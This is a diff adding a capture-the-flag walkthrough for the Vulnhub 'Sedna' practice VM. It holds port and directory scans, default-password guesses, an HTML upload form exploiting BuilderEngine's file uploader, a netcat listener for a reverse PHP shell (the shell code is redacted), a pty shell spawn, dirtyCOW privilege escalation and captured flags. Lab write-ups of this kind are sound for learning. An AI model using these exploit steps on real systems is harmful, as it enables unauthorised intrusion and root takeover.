@@ -1,9 +1,217 @@
-# Sedna : https://www.vulnhub.com/entry/hackfest2016-sedna,181/
-# There are multiple way to root this box,
-# if it should work but doesn't try to gather more info about why its not working.
-# Goals: This machine is intended to be doable by someone who have some
-# experience in doing machine on vulnhub
-# There are 4 flags on this machine One for a shell One for root access
-# and two for doing post exploitation on Sedna.
+# This is an overview of the Sedna VM off of Vulnhub: https://www.vulnhub.com/entry/hackfest2016-sedna,181/
+# On boot we see that the VM is running Ubuntu, and
+# That the VM has obtained and IP Address via DHCP:
+# IP Address: 192.168.1.117
 
 ## PHASE 1 : RECON ##
+# After establishing that the IP Address is 192.168.1.117,
+# It's safe to assume that the first logical step is nmap
+
+nmap -T4 -A -v 192.168.1.117
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-04 18:51 EDT
+NSE: Loaded 138 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 18:51
+Completed NSE at 18:51, 0.00s elapsed
+Initiating NSE at 18:51
+Completed NSE at 18:51, 0.00s elapsed
+Initiating ARP Ping Scan at 18:51
+Scanning 192.168.1.117 [1 port]
+Completed ARP Ping Scan at 18:51, 0.13s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 18:51
+Completed Parallel DNS resolution of 1 host. at 18:51, 4.00s elapsed
+Initiating SYN Stealth Scan at 18:51
+Scanning Sedna.columbus.rr.com (192.168.1.117) [1000 ports]
+Discovered open port 111/tcp on 192.168.1.117
+Discovered open port 110/tcp on 192.168.1.117
+Discovered open port 22/tcp on 192.168.1.117
+Discovered open port 139/tcp on 192.168.1.117
+Discovered open port 8080/tcp on 192.168.1.117
+Discovered open port 53/tcp on 192.168.1.117
+Discovered open port 995/tcp on 192.168.1.117
+Discovered open port 80/tcp on 192.168.1.117
+Discovered open port 143/tcp on 192.168.1.117
+Discovered open port 445/tcp on 192.168.1.117
+Discovered open port 993/tcp on 192.168.1.117
+Completed SYN Stealth Scan at 18:51, 4.63s elapsed (1000 total ports)
+
+# Two things stick out like a sore thumb (to me) First, port 80, which
+# was open on the last VM from this group, and now 8080. So, let's try both.
+
+http://192.168.1.117
+
+# This is (again) a basic webpage with little-to-no information,
+# but it does have a pretty picture of planet, so +1.
+
+http://192.168.1.117:8080
+
+# This returns something a little more interesting, a webpage for TomCat 7
+# After some research I found out that Tomcat is a Java Servlet,
+# So at least we know the person running the server is out of their damn mind
+# However, following the admin-login page link got me no where, as the following
+# user:pass combos didn't work.
+root:root
+admin:admin
+admin:password
+root:toor
+
+# With 8080 turning up to be a dead-end, let's turn back to port 80:
+
+dirb http://192.168.1.117
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Apr  4 19:00:25 2017
+URL_BASE: http://192.168.1.117/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.1.117/ ----
+==> DIRECTORY: http://192.168.1.117/blocks/
+==> DIRECTORY: http://192.168.1.117/files/
++ http://192.168.1.117/index.html (CODE:200|SIZE:101)
+==> DIRECTORY: http://192.168.1.117/modules/
++ http://192.168.1.117/robots.txt (CODE:200|SIZE:36)
++ http://192.168.1.117/server-status (CODE:403|SIZE:293)
+==> DIRECTORY: http://192.168.1.117/system/
+==> DIRECTORY: http://192.168.1.117/themes/
+
+# I stopped the scan here, because it didn't return much that interested me
+# other than the /themes/ directory. Let's dig deeper on that.
+
+wfuzz --hc 404 -w /usr/share/wfuzz/wordlist/general/big.txt http://192.168.1.117/FUZZ
+
+********************************************************
+* Wfuzz 2.1.3 - The Web Bruteforcer                      *
+********************************************************
+
+Target: http://192.168.1.117/FUZZ
+Total requests: 3036
+
+==================================================================
+ID      Response   Lines      Word         Chars          Request
+==================================================================
+
+01031:  C=301      9 L        28 W          313 Ch        "files"
+02630:  C=301      9 L        28 W          314 Ch        "system"
+
+Total time: 17.73919
+Processed Requests: 3036
+Filtered Requests: 3034
+Requests/sec.: 171.1464
+
+# Well, this is fun. wfuzz didn't return much as well.. Let's check out that robots.txt file that
+# was mentioned in the dirb scan.
+
+http://192.168.1.117/robots.txt
+
+User-Agent: *
+Disallow: Hackers
+
+# Well, that was useful. Let's explore the /themes/ directory then.
+
+http://192.168.1.117/themes/
+
+# Ah, here we go. /themes/ takes you to a directory index,
+# and we can see a few different "default_theme_"s. I chose 2015,
+# The picture in screenshot.jpg shows builder engine v3,
+# So, let's go for that.
+
+## PHASE 2 : EXPLOIT
+
+# A little time on exploit-db.com turned this up:
+# https://www.exploit-db.com/exploits/40390/
+# So, let's use that. First, we'll create a file with the following code:
+
+<html>
+<body>
+<form method="post" action="http://192.168.1.117/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
+    <input type="file" name="files[]" />
+    <input type="submit" value="send" />
+</form>
+</body>
+</html>
+
+# opening that file in my browser gets an upload prompt,
+# so we'll upload a reverse PHP shell
+
+-- PHP SHELL REDACTED --
+
+nc -lvp 1337
+
+# Now that the connection is established, let's get a proper shell
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
+python /tmp/shell.py
+
+# And now we have a shell. Let's do a little digging.
+
+$ whoami
+www-data
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ cd /var/www
+$ ls
+flag.txt
+html
+$ cat flag.txt
+bfbb7e6e6e88d9ae66848b9aeac6b289
+
+### FIRST FLAG DOWN ###
+
+# Now with the WWW flag down, let's get root.
+# Because of the previous info, and the date that
+# this box was posted, we can assume that dirtyCOW will
+# allow us to gain root. Using the same uploader as earlier,
+# I uploaded my dirtyCOW file (1337.c) to the machine
+
+cp /var/www/html/files/1337.c /tmp/1337.c
+
+# compile the code
+
+gcc -pthread 1337.c -o 1337 -lcrypt
+
+./1337
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+
+id
+uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
+
+## PHASE 3 : POST-EXPLOIT ##
+
+# get the flags
+locate flag
+
+# Admitting locate output
+
+cat /root/flag.txt
+a10828bee17db751de4b936614558305
+
+## There are now two more flags on the machine. I will commit a new
+## file as soon as I locate the flags. :D 
